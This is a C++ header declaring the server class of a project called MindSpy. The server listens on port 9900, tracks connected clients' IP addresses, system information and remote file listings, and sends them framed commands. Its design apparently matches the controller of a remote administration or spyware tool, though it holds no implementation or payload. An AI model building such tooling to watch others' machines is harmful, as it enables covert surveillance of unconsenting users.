/**
* @file Servidor.h
* @author Carlos D. Alvarez
* @date 10/12/2016
* @brief Define la clase Servidor
*/

#pragma once
#include <windows.h>
#include <iostream>
#include <vector>
#include <cstdio>
#include "../Datos.h"
using namespace std;
#define NO_PUERTO			9900
#define NO_SRV_CMDS			3
#define IP_NO_REGISTRADA	-1

namespace MindSpy 
{
	/**
	 * @class	Servidor
	 * @brief	Contiene los métodos para operar con conexiones al cliente.
	 */
	class Servidor {
	private:
		/**
		 * @struct	stCon
		 * @brief	Almacena los datos de un cliente.
		 */
		typedef struct stCon
		{
			//! Identificador único de la conexión. 
			int ID;
			//! Ip asociada a la conexión
			char IP[32];
			//! Nombre de la conexión, por defecto vacío
			char Alias[32];
			//! Indicador de actividad
			bool Activa;
			//! Socket asociado a la conexión
			SOCKET c_socket;
			//! Información del sistema del cliente
			stSystemInfoResponse SistemaCliente;
			//! Arreglo de archivos o carpetas de un directorio en el cliente
			vector <stFile> archivos;
		} CONEXION, *PCONEXION;

		//! Datos de conexión
		WSADATA wsa;
		//! Socket de escucha del servidor
		SOCKET s;
		//! Arreglo de conexiones de clientes
		vector<CONEXION> Conexiones;
		//! Direcciones IP de clientes y servidor
		sockaddr_in server, client;
		//! Variables de propósito general
		int c, resultado;

		/**
		 * @brief	Procedimiento a ejecutar en cada cliente.
		 */
		void HiloConexion();
		
		/**
		 * @brief	Procedimiento a ejecutarse por parte del servidor. Gestiona conexiones entrantes.
		 */
		void HiloEscucha();

		/**
		 * @brief	ThreadProc de redirección a HiloConexion
		 * @param[in]	lParam	Recibe un puntero a un objeto de la clase servidor.
		 */
		static DWORD CALLBACK HiloConexionStatic(LPVOID lParam) {
			Servidor * c = reinterpret_cast<Servidor*> (lParam);
			c->HiloConexion();
			return TRUE;
		}
		
		/**
		 * @brief	ThreadProc de redirección a HiloEscucha
		 * @param[in]	lParam	Recibe un puntero a un objeto de la clase Servidor.
		 * @return	Siempre regresa TRUE.
		 */
		static DWORD CALLBACK HiloEscuchaStatic(LPVOID lParam) {
			Servidor * c = reinterpret_cast<Servidor*> (lParam);
			c->HiloEscucha();
			return TRUE;
		}
	protected:
	public:
		/**
		 * @brief	Constructor por defecto de la clase Servidor
		 */
		Servidor();
		/**
		 * @brief	Destructor de la clase Servidor
		 */
		~Servidor();

		/**
		 * @brief	Verificador de actividad en el servidor
		 * @return	True si el servidor está activo. False en caso contrario
		 */
		bool Listo();

		/**
		 * @brief	Colocar o cambiar el nombre de una conexión
		 * @param[in]	IP   	La IP asociada al Alias
		 * @param[in]	Alias	El nuevo Alias
		 * @return	True si se cambió el alias, false en caso contrario.
		 */
		bool SetAlias(const char* IP, const char* Alias);

		/**
		 * @brief	Envia un comando, junto con su data, al cliente
		 * @param [in]	IP		  	IP a enviar el mensaje
		 * @param [in]	SizeofData	Information describing the sizeof.
		 * @param [in]	comando   	The comando.
		 * @param [in]	Data	  	If non-null, the data.
		 *
		 * @return	true si se pudo enviar el comando, false en caso contrario
		 * @note 
		 *	La estructura de los paquetes a enviar, es siempre la misma, independientemente de
		 *	los datos a enviar. Sin embargo, el tamaño de dichos datos puede variar.<br>
		 *	Los primeros cuatro bytes del paquete, corresponden al tamaño del paquete. Los segundos
		 *	cuatro bytes corresponden al comando asociado a la data y del octavo byte en adelante,
		 *	se ubica la data a enviar.
		*/
		bool EnviarComando(char* IP, UINT32 SizeofData, UINT32 comando, BYTE* Data);

		/**
		 * @brief	Iniciar escucha del servidor.
		 */
		void IniciarEscucha();

		/**
		 * @brief	Indica si una IP está registrada y activa.
		 * @param[in]	IP	La IP a verificar.
		 * @return	Un número mayor o igual a cero si la IP existe, -1 en caso contrario.
		 */
		int IpRegistrada(const char*IP);
	};
}